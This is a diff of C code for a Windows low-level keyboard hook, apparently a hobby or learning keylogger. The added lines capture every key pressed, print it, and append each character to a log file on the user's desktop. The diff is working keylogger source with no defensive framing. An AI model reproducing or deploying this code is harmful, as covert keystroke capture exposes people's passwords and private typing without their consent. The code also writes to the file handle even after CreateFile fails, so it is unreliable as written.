@@ -19,24 +19,65 @@ https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
 LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
 {
     KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
+    DWORD   kCode = 0;
+
+    /*DWORD file = GetFileAttributes("C:\\Users\\r4mnesia\\Desktop\\log.txt");
+    if (file != INVALID_FILE_ATTRIBUTES)
+    {
+        // openfile 
+    }
+    else
+    {
+        // create file 
+    }*/
+
+
+
     if (wParam == WM_KEYDOWN)
     {
         switch(pkey->vkCode)
         {
             case VK_SPACE:
+                kCode = pkey->vkCode;
                 printf("[SPACE]");
                 break ;
             case VK_RETURN:
+                kCode = pkey->vkCode;
                 printf("[ENTER]");
                 break ;
             case VK_BACK:
+                kCode = pkey->vkCode;
                 printf("[BACKSPACE]");
                 break ;
             default:
+                kCode = pkey->vkCode;
                 printf("%c", (char)pkey->vkCode);
+                HANDLE  hFile = CreateFile(
+                    "C:\\Users\\r4mnesia\\Desktop\\log.txt",
+                    GENERIC_WRITE,
+                    0,
+                    NULL,
+                    OPEN_ALWAYS,
+                    FILE_ATTRIBUTE_NORMAL,
+                    NULL
+                );
+            
+                if (hFile == INVALID_HANDLE_VALUE) {
+                    printf("CreateFile error: %lu\n", GetLastError());
+                    // return NULL;
+                }
+            
+                SetFilePointer(hFile, 0, NULL, FILE_END);
+
+                char    c = (char)pkey->vkCode;
+                DWORD   written;
+
+                WriteFile(hFile, &c, 1, &written, NULL);
+                CloseHandle(hFile);
                 break ;
         }
     }
+
 
     return CallNextHookEx(NULL, code, wParam, lParam);
 }
